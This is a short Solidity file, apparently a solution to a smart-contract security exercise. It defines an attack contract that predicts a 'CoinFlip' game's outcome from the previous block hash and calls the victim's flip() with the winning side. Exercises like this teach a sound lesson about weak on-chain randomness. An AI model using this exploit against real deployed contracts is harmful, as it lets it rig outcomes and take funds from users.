pragma solidity ^0.8.11;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract CoinFlipAttack {
    using SafeMath for uint256;
    CoinFlip private _victim;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address payable victim) {
        _victim = CoinFlip(victim);
    }

    function attack() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
        bool side = coinFlip == 1 ? true : false;

        return _victim.flip(side);
    }
}
